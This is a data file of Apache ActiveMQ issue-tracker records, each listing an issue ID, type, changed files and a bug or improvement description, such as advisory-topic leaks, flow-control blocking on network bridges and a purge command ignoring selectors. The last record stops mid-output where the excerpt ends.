texts:ActiveMQ.Advisory.xxxxxx.TempQueue.xxx, AMQ.A.xxx.Queue.xxx and AMQ.A.xxx.Topic.xxx Topics don&#39;t get removed when the originating tempQueue, Queue or Topic is removed so is somewhat a memory leak
Seems like support for removing some Advisories topics when their originating queue, topic, tempQueue or tempTopic is removed has not been provided.In RegionBroker.java :    public void removeAdvisoryTopics(String destinationType, ConnectionContext context, ActiveMQDestination destination, long timeout) throws Exception {        if (this.brokerService.isAdvisorySupport()) {            String producerAdvisoryTopic = AdvisorySupport.PRODUCER_ADVISORY_TOPIC_PREFIX + destinationType + destination.getPhysicalName();            String consumerAdvisoryTopic = AdvisorySupport.CONSUMER_ADVISORY_TOPIC_PREFIX + destinationType + destination.getPhysicalName();            ActiveMQDestination dests[] = getDestinations();            for (ActiveMQDestination dest: dests) {                String name = dest.getPhysicalName();                if ( name.equals(producerAdvisoryTopic) || name.equals(consumerAdvisoryTopic) ) {                    try {                        removeDestination(context, dest, timeout);                    } catch (JMSException ignore) {                        // at least ignore the Unknown Destination Type JMSException                    }                }            }        }    }   Seem like PRODUCER_ADVISORY_TOPIC and CONSUMER_ADVISORY_TOPIC topics are the only advisories removed when originating destination is removed. Most advisories when enabled in the policy do not get removed.
issueID:AMQ-3325
type:Bug
changed files:
texts:PList temp store,  chunk stream does not exist when broker under stress
apparent concurrency issue, multicore (8 cpu) under load, sporadic occurrence, related to memory limits and dynamic destination creation/deletion. Broker stack trace:2011-04-07 08:04:07,295 [Queue:loadq-4  ] ERROR FilePendingMessageCursor       - I/O errorjava.io.EOFException: Chunk stream does not exist at page: 198 at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:454) at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:431) at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:428) at org.apache.kahadb.page.Transaction.load(Transaction.java:404) at org.apache.kahadb.page.Transaction.load(Transaction.java:361) at org.apache.activemq.store.kahadb.plist.PList.loadEntry(PList.java:468) at org.apache.activemq.store.kahadb.plist.PList.getNext(PList.java:483) at org.apache.activemq.store.kahadb.plist.PList$10.execute(PList.java:312) at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) at org.apache.activemq.store.kahadb.plist.PList.getNext(PList.java:310) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.next(FilePendingMessageCursor.java:500) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.next(FilePendingMessageCursor.java:473) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.next(FilePendingMessageCursor.java:293) at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1714) at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1932) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1440) at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:104) at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42)
issueID:AMQ-3326
type:Improvement
changed files:RegionBroker.java
texts:Synchronization point in RegionBroker adding and removing producers and consumers
Synchronization blocks were added to the RegionBroker as a result of AMQ-2821 (automatic removal of inactive destinations). I believe the author was trying to prevent adding and removing producers while the inactive destination removal process was running.This is a major performance bottle neck in use case scenarios where many clients are subscribing and unsubscribing simultaneously &#8211; specifically, in order to retrieve one and only one message from a queue using the STOMP protocol (without holding onto a prefetch message) you must subscribe, retrieve a message and then unsubscribe from the destination. This activity causes lots of adding and removing of producers and consumers.I"m still not entirely convinced that the destination removal process needs to be protected in that manner, but the attached patch uses a ReentrantReadWriteLock to continue to protect the destination removal process, while still allowing clients to add and remove producers and consumers concurrently when the destination process is not running.This patch also relates to AMQ-3070 (where the user was complaining about this same synchronization block).I"m attaching patches both for the trunk and for 5.4.2 (which is what I"m still using).There are other synchronization blocks further down in the code (inside AbstractRegion and Queue implementations), but in my particular use case, the 2-3x performance enhancement I get of this patch alone are enough to satisfy my immediate concerns.
issueID:AMQ-3328
type:Improvement
changed files:
texts:upgrade some bundle versions for activemq-karaf feature.xml
None
issueID:AMQ-3329
type:Improvement
changed files:
texts:Upgrade to use latest camel web-console in AMQ distribution
The web console that is shipped with ActiveMQ 5.5.0 release is an older Camel web-console.You should upgrade to pickup the latest changes and development.
issueID:AMQ-3331
type:Bug
changed files:
texts:When a producer from a network bridge is blocked by producer flow control, all producers from the network bridge get blocked.
Symptom=======Broker A produces messages to two queues, Q1 and Q2.  Broker B consumes messages from two queues, Q1 and Q2.  Broker A is connected by a demand forwarding bridge, over TCP, to Broker B so that messages produced to Q1/Q2 will be forwarded to the consumers on Broker B.At some point, Broker B"s instance of Q2 becomes full (e.g., because the Q2 consumer is slow), and this triggers producer flow control to halt new messages being sent to Broker B"s Q2 over the bridge.  Broker A"s instances of Q1/Q2 are not full, so the producers on Broker A are not blocked.If the messages produced by Broker A are persistent, we see this behaviour over the course of the production of 1000 messages to both Q1/Q2, where Broker B"s Q2 becomes full on the 500th message:Broker A       Bridge        Broker B========                     ========0->1000->0     ------>       0->1000->...0->1000->500                 0->500->...The above results, which assume network and consumer prefetch sizes of 1, are what we expected, namely:  Broker A produces 1000 messages to Q1 without blocking and all of these messages are forwarded to Broker B"s Q1 without blocking, eventually being consumed by Broker B"s Q1 consumer. Broker A produces 1000 messages to Q2 without blocking and 500 of these messages are forwarded to Broker B"s Q2 before producer flow control blocks the flow until Broker B"s Q2 consumer can start reducing the queue size.This is good because the bridge treats Q1 and Q2 independently (i.e., producer flow control on Q2 does not block the messages forwarded to Q1).If the messages produced by Broker A are non-persistent, we see this behaviour:Broker A       Bridge        Broker B========                     ========0->1000->500   ------>       0->500->...0->1000->500                 0->500->...The above results, which assume network and consumer prefetch sizes of 1, are not what we expected, namely: producer flow control on Broker B"s instance of Q2 blocks the forwarding of messages to Broker B"s instance of Q1.This is not good because producer flow control on Q2 essentially triggers producer flow control on Q1, even though Q1 is not full.It also seems strange (and almost non-intuitive until you understand the cause), that peristent messages should behave better than non-persistent messages.  The same difference in behaviour can also be observed with persistent messages if Broker A these outside a JMS transaction (e.g., AUTO_ACKNOWLEDGE) versus inside a JMS transaction: outside behaves appropriately, with Q1 independent of Q2, but inside behaves the same as the non-persistent case with Q1 blocked by Q2.These observations are contrary to the AMQ 5.0 documentation regarding producer flow control: As of ActiveMQ 5.0, we can now individually flow control each producer on a shared connection without having to suspend the entire connection.Cause=====The difference in behaviour between persistent and non-persistent (and transactionaly/non-transactional) is due to the two ways that org.apache.activemq.broker.region.Queue implements producer flow control:Queue#send(...)// We can avoid blocking due to low usage if the producer is// sending// a sync message or if it is using a producer windowif (producerInfo.getWindowSize() > 0 || message.isResponseRequired()) {andQueue#send(...)} else   if (memoryUsage.isFull()) {    waitForSpace(context, memoryUsage, "Usage Manager Memory Limit is full. Producer ("                                + message.getProducerId() + ") stopped to prevent flooding "                                + getActiveMQDestination().getQualifiedName() + "."                                + " See http://activemq.apache.org/producer-flow-control.html for more info");  }There is only a single transport thread that services the TCP socket on Broker B.  This TCP socket is the "remote" end of the A->B bridge and is responsible for sequentially enqueueing to Broker B"s queues all messages from Broker A.  When a non-persistent or transactional message is sent to Broker A"s queues, it has responseRequired=true, which is preserved when the bridge forwards the message to Broker B"s queues.  If producer flow control is triggered on Broker B"s queue, the first method of producer flow control will be used: the transport thread will not block, but the repsonse will be held back until the queue has room.  As a result, the transport thread is free to continue enqueueing messages from the bridge, particularly those destined for queues that are not full (NOTE: since the network prefetch is 1 no new messages to the full queue will be forwarded until the response is returned).When a persistent or non-transactional message is sent to Broker A"s queues, it has responseRequired=false, which is preserved when the bridge forwards the message to Broker B"s queues.  If producer flow control is triggered on Broker B"s queue, the second method of producer flow control will be used: the transport thread will be blocked.  As a result, no other messages from the bridge will be forwarded, even those destined for queues that are not full.The preservation of the responseRequired flag occurs in org.apache.activemq.network.DemandForwardingBridgeSupport:DemandForwardingBridgeSupport#serviceLocalCommand(...)if (!message.isResponseRequired()) {        // If the message was originally sent using async    // send, we will preserve that QOS    // by bridging it using an async send (small chance    // of message loss).    try {        remoteBroker.oneway(message);        localBroker.oneway(new MessageAck(md, MessageAck.INDIVIDUAL_ACK_TYPE, 1));        dequeueCounter.incrementAndGet();    } finally {        sub.decrementOutstandingResponses();    }    } else {        // The message was not sent using async send, so we    // should only ack the local    // broker when we get confirmation that the remote    // broker has received the message.    ResponseCallback callback = new ResponseCallback() {        public void onCompletion(FutureResponse future) {            try {                Response response = future.getResult();                if (response.isException()) {                    ExceptionResponse er = (ExceptionResponse) response;                    serviceLocalException(er.getException());                } else {                    localBroker.oneway(new MessageAck(md, MessageAck.INDIVIDUAL_ACK_TYPE, 1));                    dequeueCounter.incrementAndGet();                }               } catch (IOException e) {                serviceLocalException(e);            } finally {                sub.decrementOutstandingResponses();            }        }    };        remoteBroker.asyncRequest(message, callback);}The apparent preservation of responseRequired is a result of remoteBroker.oneway(message); versus remoteBroker.asyncRequest(message, callback);Solution========It seems odd that there should be any concern for the message"s original responseRequired flag.  Once the message is dispatched to the bridge for forwarding, the original producer ceases to care and not waiting for a response.  Once a response is returned from the remote broker, it is only used to signal the message ACK so that the local broker so that the inflight and dequeue counts can be updated &#8212; neither the response nor the ACK continues on to the original producer.Because the blocking of the network bridge by producer flow control on one queue can have a serious side effect (blocking the bridge completely), I think the best solution is to remove the logic from DemandForwardingBridgeSupport that takes into account message.isResponseRequired and simply always forwards the message with remoteBroker.asyncRequest(message, callback);Alternatively (and unnecessarily if the remoteBroker.oneway(message); is removed), I"ve attached a patch that adds a remoteDispatchType field to org.apache.activemq.network.NetworkBridgeConfiguration.remoteDispatchType can have one of three values: AUTO - DemandForwardingBridgeSupport works as described above and uses remoteBroker.oneway(message); or remoteBroker.asyncRequest(message, callback); depending on message.isResponseRequired ALWAYS_SYNC - DemandForwardingBridgeSupport uses remoteBroker.asyncRequest(message, callback); to forward all messages (i.e., it behaves the same as the first suggested solution) ALWAYS_ASYNC - DemandForwardingBridgeSupport uses remoteBroker.oneway(message); to forward all messagesA unit test is also included which demonstrates the good/bad behaviour for all combinations of persistent/non-persistent and remoteDispatchType.  Pay particular note to the final assertions in the unit test &#8211; the test is designed to pass as-is by modifying the expectations to validate the bad behaviour when necessary.  Ideally, the bad behaviour should cause test case failure if you feel that blocking the entire network bridge is a bug.
issueID:AMQ-3332
type:Improvement
changed files:
texts:Make optimizeAckTimeout configurable to allow for different network latencies.
With very slow networks, the beneficial reduced network traffic effect of setOptimizeAcknowledge is bypassed by the default 300ms timeout on an ack batch. This needs to be configurable so that the timeout feature can be disabled or extended for slow networks.
issueID:AMQ-3334
type:Task
changed files:
texts:upgrade to specs 1.8.0 for activemq-karaf feature.xml
to pick up the recent fix for high performance and users can specify factory through system property
issueID:AMQ-3335
type:Improvement
changed files:TaskRunnerFactory.java
texts:Allow TaskRunnerFactory to be configured on the broker via xml config
To allow the maxIterations per run to be configured, to effect fairness, the task runner factory needs to be exposed via xbean such that it can be configured on the broker.
issueID:AMQ-3337
type:Improvement
changed files:ManagedRegionBroker.java
texts:Add MBean to view Producers that are active on the Broker
Add an MBean and methods in the BrokerViewMBean to get information on Producers that are currently active on Destinations on the Broker.
issueID:AMQ-3338
type:Improvement
changed files:
texts:Increase default maximum memory setting
256MB that is currently is used is small limit for the modern hardware
issueID:AMQ-3339
type:Improvement
changed files:
texts:Allow for an option to bound the number of GC&#39;d Destinations when using gcInactiveDestinations=true
When gcInactiveDestinations=true there is the situation where many (1000"s) inactive destinations are all garbage collected at the same time. This can adversely affect the performance of the broker. It would be nice to have the ability to set a maximum number of destinations to remove per sweep (e.g. maxGCDestinationsPerSweep=500).
issueID:AMQ-3340
type:Improvement
changed files:
texts:Allow to specify user/pass for examples
ProducerTool and ConsumerTool have user/password attributes but they"re not exposed to Ant at the moment. We should be able to doant producer -Duser=system -Dpassword=managerant consumer -Duser=system -Dpassword=manager
issueID:AMQ-3341
type:Improvement
changed files:DestinationMap.java
texts:Allow reseting DestinationMap
Currently there"s no way to reset once initialized destination map
issueID:AMQ-3342
type:Bug
changed files:
texts:Shutdown of broker waiting for shared fileystem lock blocks
Shutting down a broker that has not completed startup due to waiting for a shared filesystem lock does not complete.Using an internal BrokerService() and it"s stop() method is definitely impacted.The attached patch simply adds a check for "isStopped() || isStopping()" to the MessageDatabase lock loop.
issueID:AMQ-3347
type:Improvement
changed files:
texts:Allow restart of network connectors
We should be able to stop/start network connectors
issueID:AMQ-3348
type:Improvement
changed files:
texts:Ability for dynamically add, remove, start and stop network connectors
There are some use cases where the ability to add, remove, start and stop network connectors is extremely helpful.
issueID:AMQ-3349
type:Improvement
changed files:
texts:Web console tooltips should not have transparent background
When viewing AMQ through the web console, you can hover over many items for a tooltip to be shown. Problem is the background is partly transparent which makes the foreground text in many places almost unreadable.Fix: edit webapps/admin/styles/type-settings.css and apply z-index: 10; to .tooltip:hover spanThis resolves the matter in Firefox 4.
issueID:AMQ-3350
type:Bug
changed files:
texts:amq.js initHandler() method swallows first message received
The very first message received by a javascript client (when using amq.js) is swallowed with no action. This is because the sendPoll() method calls initHandler() from the successCallback handler when the message arrives and the boolean sessionInitialized is false. This sends the code into the initHandler() method which in the end just calls sendPoll() again.  It never bothers calling pollHandler() to deal with the message it received.amq.js        // *** This method does not process the data passed in. It just calls sendPoll() again! var initHandler = function(data) {  sessionInitialized = true;  if(sessionInitializedCallback) {   sessionInitializedCallback();  }  sendPoll(); } var sendPoll = function() {  // Workaround IE6 bug where it caches the response  // Generate a unique query string with date and random    var now = new Date();  var timeoutArg = sessionInitialized ? timeout : 0.001;  var data = "timeout=" + timeoutArg * 1000     + "&d=" + now.getTime()     + "&r=" + Math.random();  var successCallback = sessionInitialized ? pollHandler : initHandler;          var options = { method: "get",   data: addClientId( data ),   success: successCallback,   error: pollErrorHandler};  adapter.ajax(uri, options); };
issueID:AMQ-3351
type:Improvement
changed files:LocationMarshaller.java
texts:Usage of the temp store index by the PList needs the be improved
Problem manifests when systemUsage memory limit is triggered and the pending message cursor for non persistent messages is flushing its in memory cache to temp store, this is taking a long time and in the mean time, other cursors that need to flush to disk are blocking on the temp store, and other sends to that destination are blocked.In this scenario, the broker will come back to life once the flush completes. The problem is that the all cursors will see the same limit at the same time and try and flush.The usage of the temp store index by the PList needs the be improved, it is not optimal at the moment as it uses too much space in the index. It uses a page per entry and reading from it, once the page cache is exhausted, is too slow.
issueID:AMQ-3352
type:Bug
changed files:
texts:failover ConnectionStateTracker can lead to OOM with TextMessages
With a reasonable large textmessage, the connection state tracker, which keeps an LRU cache of messages for redelivery on failover, can grow. The problem is the use of message size, which is approximated before marshaling. The approximation is > the encoded size so the size increments on a track back are larger than the decrements on a track, which lease to growth in the number of messages cached and can lead to an OOM.The fix appears to be to not cache a copy of the message, such that the increment when the message is evicted will reflect the decrement after marshaling. The change that exposed this issue is https://issues.apache.org/jira/browse/AMQ-2585 - without that change the state tracker capacity would shrink.
issueID:AMQ-3353
type:Bug
changed files:
texts:Durable subscribers on durable topics don&#39;t receive messages after network disconnect
I"ve set up a durable topic with the default (persistent) delivery mode on one machine that is publishing a simple text message every 5 seconds. I created a durable subscriber that consumes messages published to the above topic on another machine. I am using broker to broker communication between the two machines.I start up the two programs on either machine and see the messages coming through to the subscriber. If I then pull the network cable to disconnect the network between the two machines, wait for a minute and then plug it back in, my subscriber doesn"t receive the messages any more. I can see from the output that the publisher is still publishing them (Temporary topics, non-durable queues all continue to sync up in our production environment, it is only the durable topics that don"t work after network reconnect)If I were to tweak a setting on the publisher"s broker (that was introduced only in 5.5.0), suppressDuplicateTopicSubscriptions=false, then the topics work correctly after network reconnect. But this may have other unintended consequences and I was hoping to get a better idea of: is this a known issue ? if so, then are there any specific challenges that have caused it not to be fixed? are other people out there using durable topics and subscribers without a failover option that have run into this problem? What have they done to work around?Here is how my subscriber and publisher are set up:Topic Publisher (Machine 1)        publisherConnection = connFactory.createConnection();        publisherConnection.setClientID( "ProducerCliID" );        publisherConnection.start();        session = publisherConnection.createSession( true, -1 );        Destination producerTopic = session.createTopic( TEST_TOPIC_NAME );        producer = session.createProducer( (Topic)producerTopic );............    // On a timer, keep sending this out every 5 seconds                 String text = "HELLO " + count++;                TextMessage msg = session.createTextMessage( text );                System.out.println( "Sending TextMessage = " + msg.getText() );                producer.send( msg );                session.commit();Subscriber ( Machine 2):        Connection clientConnection = connFactory.createConnection();        clientConnection.setClientID("cliID");        clientConnection.start();        Session session = clientConnection.createSession( false, Session.AUTO_ACKNOWLEDGE );        Destination topic = session.createTopic( topicName );        MessageConsumer subscriber = session.createDurableSubscriber( (Topic)topic, "subName" );        TestMessageListener msgListener = new TestMessageListener( 1000 );        subscriber.setMessageListener( msgListener );..........         // TestMessageListener"s onMessage method simply outputs the message:        public void onMessage(Message message)        {            if ( message instanceof TextMessage )            {                System.out.println( "Message received = " + ((TextMessage)message) );            }        }I can provide the jars for you to run the program if need be.
issueID:AMQ-3356
type:Improvement
changed files:
texts:DispatchedQueueCount (messages pending dispatch) should be visible on the jmx connection view
when the network is slow, pending messages queued for dispatch on a connection should be visible. It was removed as part of the inactive stats in https://issues.apache.org/jira/browse/AMQ-2302
issueID:AMQ-3357
type:Bug
changed files:
texts:vmQueueCursor or fileQueueCursor with expired messages in the store can lead to startup hang with kahaDB
expiry during recovery, which is a read operation, can lead to the need to modify the store. The recovery processing should take out a readwrite lock on the store.Issue arises for vm or file cursors as they replay messages from the store on restart to fill their caches. This issue can be avoided by using the default Store cursor, so the workaround is to configure the store cursor, restart, and revert back to the chosen cursor.
issueID:AMQ-3359
type:Bug
changed files:
texts:UDP Transport connector listens on a random port number
The broker listens on a random UDP port number instead of the one configure in the URI. The port number changes each time the broker is restarted. However, the management console indicates that the broker"s listening on the configured port number while it is not the case (netstat shows another UDP port number). The reason  is that (as seen in the following block) the UdpTransport constructor does not assign "this.port" from remoteLocation but only reads the address and leaves "this.port" to be zero. Subsequently, Java API picks any available port number when it is creating the DatagraSocket. The solution is to add this line: "this.port = remoteLocation.getPort();" to the following constructor as seen in the accompanying patch.public UdpTransport(OpenWireFormat wireFormat, URI remoteLocation) throws UnknownHostException, IOException {        this(wireFormat);        this.targetAddress = createAddress(remoteLocation);        description = remoteLocation.toString() + "@";}
issueID:AMQ-3362
type:Improvement
changed files:
texts:Broker does not check for expired persistent topic msgs.
When using topics with durable subscriptions, where subscribers disconnect for a while, there is no task that checks for expired messages on the durable subscription.In case where subscribers are disconnected for hours and message are still sent with a TTL, it may happen that either the producer gets blocked (in case of flow control) or the broker runs out of persistent storage (no flow control) just because of msgs that are already expired.Similar to queues, there should be a periodic task that checks for expired msgs on durable topic subs. This task should also be configurable using a property similar to expireMessagesPeriod.
issueID:AMQ-3365
type:Improvement
changed files:
texts:pid file should contain host name
When starting multiple brokers from different hosts using shared storage, they will override pid file making it impossible to stop cleanly previously started brokers. This doesn"t happen with multiple brokers on the same host, as the script will detect the broker is already running. By adding the host name to the pid file name, it will be possible to keep pid files of multiple host brokers in the same folder.
issueID:AMQ-3374
type:Bug
changed files:Transaction.java
texts:Long KahaDB transactions could lead to OutOfMemory
Problem: all writes are kept in memory until the sync time, which for long transactions could be a problem.Solution: define max transaction size and if threshold is reached keep the rest of the writes in a temp file
issueID:AMQ-3375
type:Bug
changed files:
texts:stomp consumer might not receive all msgs of a virtual topic queue with memory limits
Have a testcase that connects a Java stomp consumer to a virtual destination queue and consumes a fixed amount of msgs.During the test I noticed that the consumer does not always receive the full amount of msgs.Instead the receive times out although JMX QueueSize property is greater than 0. However when trying to browse the queue using JMX, it returns null, despite the fact that not all msgs got dequeued yet (dispatch and dequeue counter < enqueue counter).So far I reproduced this with a stomp producer/consumer only. The producer writes msgs to a virtual topic VirtualTopic.Foo and the consumer takes msgs off the Consumer.A.VirtualTopic.Foo queue. Using JMX I noticed all msgs got moved from the virtual topic to the queue (reflected by JMX enqueue counter) but not all msgs got consumed.So it seems the broker lost some msgs on the way.
issueID:AMQ-3378
type:Improvement
changed files:SubscriptionView.java
SubscriptionViewMBean.java
texts:Expose isSlowConsumer for SubscriptionView
None
issueID:AMQ-3379
type:New Feature
changed files:
texts:Implement eviction strategy based on property value uniqueness
For a topic subscriber which is sensitive on a message property, we"d want to keep only the last message for every property value and discard the older ones.
issueID:AMQ-3381
type:Bug
changed files:BrokerFacadeSupport.java
texts:Connections web console page shows two rows per connection (one empty)
None
issueID:AMQ-3382
type:Bug
changed files:
texts:staticallyIncludedDestinations should always be forwarded
Even if the "parent" destination has been excluded
issueID:AMQ-3383
type:Improvement
changed files:
texts:Add a string property (token) to ConnectionControl so the broker could potentially communicate a security token to a client after it authenticates
When a client creates a connection to a secured broker and authenticates in there"s no means for the broker to communicate back to the client some kind of security token should the underlying authentication/authorization method allow for it.  The attached patch adds a string field to ConnectionControl (also ran the openwire generator too, included in the patch) called "token" that can be used for this.
issueID:AMQ-3384
type:Improvement
changed files:
texts:destinationFilter could be generated automatically by DemandForwardingBridgeSupport based on list of dynamicallyIncludedDestinations
Digging into the Advisory messages we found one "missing" feature.Network connector creates listener on Advisory topics on remote broker (and contrary for duplex NC). Listener created for topics like this:DemandForwardingBridgeSupport.java:368                 String advisoryTopic = AdvisorySupport.CONSUMER_ADVISORY_TOPIC_PREFIX + configuration.getDestinationFilter();369                 if (configuration.isBridgeTempDestinations()) {370                     advisoryTopic += "," + AdvisorySupport.TEMP_DESTINATION_COMPOSITE_ADVISORY_TOPIC;371                 }This equals to the following:ActiveMQ.Advisory.Consumer.>, ActiveMQ.Advisory.TempQueue, ActiveMQ.Advisory.TempTopicSo that, broker will be subscribed to Consumer Advisory messages for ALL queues and topics on remote broker. But really, broker interests only for those defined in dynamicallyIncludedDestinations. We have about 80 brokers connected to central. So, ALL of them subscribed to Consumer Advisory messages for ALL queues and topics. This subscriptions produce huge "flood" traffic and creates unnecessary central broker load. This could lead to connection timeouts, reconnects and as result - produce yet more advisory traffic. If brokers have tow network connectors, number of subscriptions, traffic, load will be double. After some times of work all that central broker do is dispatching advisory messages.There is workaround. We can use "destinationFilter" attribute of networkConnector element to specify "advisory topic suffix". So, that broker will be subscribed only toActiveMQ.Advisory.Consumer.[destinationFilter], ActiveMQ.Advisory.TempQueue, ActiveMQ.Advisory.TempTopicWe have checked that this attribute works for duplex and "non-duplex" connectors.The problem with this workaround is that we have to follow very specific syntax for destinationFilter. For example, if we have tow queues defined in dynamicallyIncludedDestinations, we have to write something like:            <networkConnector uri="static:(tcp://host)" destinationFilter="Queue.outbound,ActiveMQ.Advisory.Consumer.Queue.inbound" >                <dynamicallyIncludedDestinations>                    <queue physicalName="outbound"/>                    <queue physicalName="inbound"/>                </dynamicallyIncludedDestinations>            </networkConnector>As you can see, syntax of "destinationFilter" is not trivial )Feature we would like to have is that destinationFilter could be generated automatically by DemandForwardingBridgeSupport based on list of dynamicallyIncludedDestinations. So that we don`t have to specify "destinationFilter" at all.
issueID:AMQ-3388
type:Improvement
changed files:XStreamWireFormat.java
JmsFrameTranslator.java
texts:Http/https protocol uses Xstream for serializing commands in xml. Field additions to the commands bresks xtream serializacion between amq versions
Addition of fields in commands used between clients and brokers in newer amq versions breaks easily the http transport that uses xstream for xml serialization. To make xstream more tolerant to this changes between versions in org.apache.activemq.transport.xstream.XStreamWireFormat we could add the code below so xstream ignores unknown fields :  // Implementation methods    // -------------------------------------------------------------------------    protected XStream createXStream() {       // return new XStream();       return new XStream() {            protected MapperWrapper wrapMapper(MapperWrapper next) {                return new MapperWrapper(next) {                    public boolean shouldSerializeMember(Class definedIn, String fieldName) {                        return definedIn != Object.class ? super.shouldSerializeMember(definedIn, fieldName) : false;                    }                };            }        };    }
issueID:AMQ-3393
type:Bug
changed files:
texts:Number of established STOMP connections constantly increasing
Rapid connect/disconnect can result in dangling stomp transport connection mbeans which eventually accumulate.Issue occurs when a disconnect occurs before a broker connection has been fully initiated. The delayed stop, pending start completion was bypassed by a shutdown command from the stomp protocol convertor.One potential symptom, when a client side port wrapps around and is reused for the MBean name. There is a registration failure, with 2011-06-15 12:27:22,860 [eMQ Task-125034] WARN  ManagedTransportConnection     - Failed to register MBean: org.apache.activemq:BrokerName=xx,Type=Connection,ConnectorName=stomp,ViewType=address,Name=/xx_521702011-06-15 12:27:22,860 [eMQ Task-125034] DEBUG ManagedTransportConnection     - Failure reason: javax.management.InstanceAlreadyExistsException: org.apache.activemq:BrokerName=xx,Type=Connection,ConnectorName=stomp,ViewType=address,Name=/xx_52170javax.management.InstanceAlreadyExistsException: org.apache.activemq:BrokerName=xx,Type=Connection,ConnectorName=stomp,ViewType=address,Name=/xx_52170 at com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:453) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.internal_addObject(DefaultMBeanServerInterceptor.java:1484) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:963) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:917) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:312) at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:482) at org.apache.activemq.broker.jmx.ManagementContext.registerMBean(ManagementContext.java:299) at org.apache.activemq.broker.jmx.AnnotatedMBean.registerMBean(AnnotatedMBean.java:65) at org.apache.activemq.broker.jmx.ManagedTransportConnection.registerMBean(ManagedTransportConnection.java:99) at org.apache.activemq.broker.jmx.ManagedTransportConnection.<init>(ManagedTransportConnection.java:57) at org.apache.activemq.broker.jmx.ManagedTransportConnector.createConnection(ManagedTransportConnector.java:52) at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:216) at java.lang.Thread.run(Thread)
issueID:AMQ-3397
type:Improvement
changed files:JDBCMessageStore.java
JDBCTopicMessageStore.java
texts:Improve scalability of active durable subs with JDBC message store
With 1 producer, scaling from 1 to 100 durable subs, the through put drops off significantly.
issueID:AMQ-3400
type:New Feature
changed files:
texts:Implement new LDAP authentication module that supports wildcards
The current implementation of the ldap authorization map doesn"t support setting of wildcard destinations. The change is too big to incorporate into the existing plugin, so the new one is needed.The new plugin should basically extend the default authorization plugin, just allow it to be initialized and updated from LDAP.
issueID:AMQ-3401
type:Bug
changed files:DefaultUnresolvedDestinationTransformer.java
ActiveMQDestination.java
UnresolvedDestinationTransformer.java
texts:ActiveMQ cannot determine between Queue and Topic for Weblogic destination
A JNDI lookup to Weblogic return a weblogic.jms.common.DestinationImpl instance that is the Weblogic generic implementation for Queue and Topic.In the org.apache.activemq.command.ActiveMQDestination class the transform() method can obtain both a queue name and a topic name and therefore doesn"t know in witch one to cast.The Weblogic DestinationImpl has two methods isQueue() and isTopic() for that.Here is a link to the thread about this issue: http://camel.465427.n5.nabble.com/Problem-with-ActiveMQ-to-Weblogic-route-td4578300.html
issueID:AMQ-3404
type:Bug
changed files:pom.xml
activemq.xml
PurgeCommand.java
texts:Purge command does not accept message selectors
The admin purge command does not work with a message selector.A patch is forth coming, there is some cleanup, and compliance to be vetted before I can attach the patch.(1) Browse with no arguments:user@activemq-master:~/activemq$ activemq-admin browse --amqurl tcp://localhost:61616  --view JMSTimestamp queue.FOO.BARJava Runtime: Sun Microsystems Inc. 1.6.0_22/home/y/libexec/jdk1.6.0/jre   Heap sizes: current=60800k  free=58531k  max=902976k     JVM args: -Dactivemq.classpath=""      -Djavax.net.ssl.trustStoreType=JKSACTIVEMQ_HOME: /home/y/libexec/activemqACTIVEMQ_BASE: /home/y/libexec/activemqJMS_HEADER_FIELD:JMSTimestamp = 1310608108263JMS_HEADER_FIELD:JMSTimestamp = 1310608108740JMS_HEADER_FIELD:JMSTimestamp = 1310608109283JMS_HEADER_FIELD:JMSTimestamp = 1310608109790JMS_HEADER_FIELD:JMSTimestamp = 1310608110324JMS_HEADER_FIELD:JMSTimestamp = 1310608110831JMS_HEADER_FIELD:JMSTimestamp = 1310608111374JMS_HEADER_FIELD:JMSTimestamp = 1310608111872JMS_HEADER_FIELD:JMSTimestamp = 1310608112415JMS_HEADER_FIELD:JMSTimestamp = 1310608113005(2) Browse with msgseluser@activemq-master:~/activemq$ activemq-admin browse --amqurl tcp://localhost:61616  --view JMSTimestamp --msgsel "JMSTimestamp<1310608110324" queue.FOO.BARJava Runtime: Sun Microsystems Inc. 1.6.0_22/home/y/libexec/jdk1.6.0/jre   Heap sizes: current=60800k  free=58535k  max=902976k     JVM args: -Dactivemq.classpath=""     -Djavax.net.ssl.trustStoreType=JKSACTIVEMQ_HOME: /home/y/libexec/activemqACTIVEMQ_BASE: /home/y/libexec/activemqJMS_HEADER_FIELD:JMSTimestamp = 1310608108263JMS_HEADER_FIELD:JMSTimestamp = 1310608108740JMS_HEADER_FIELD:JMSTimestamp = 1310608109283JMS_HEADER_FIELD:JMSTimestamp = 1310608109790(3) Purge with msgsel: - Not Working -  (what I wanted here was to use only thosematching my criteria)user@activemq-master:~/activemq$ activemq-admin purge --msgsel "JMSTimestamp<1310608110324" queue.FOO.BARJava Runtime: Sun Microsystems Inc. 1.6.0_22/home/y/libexec/jdk1.6.0/jre   Heap sizes: current=60800k  free=58531k  max=902976k     JVM args: -Dactivemq.classpath=""      -Djavax.net.ssl.trustStoreType=JKSACTIVEMQ_HOME: /home/y/libexec/activemqACTIVEMQ_BASE: /home/y/libexec/activemqConnecting to JMX URL:service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmiINFO: Removing message:ID:activemq-master-55970-1309958858075-2:32:1:1:1from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:32:1:1:2from queue: queue.FOO.BARINFO: Removing 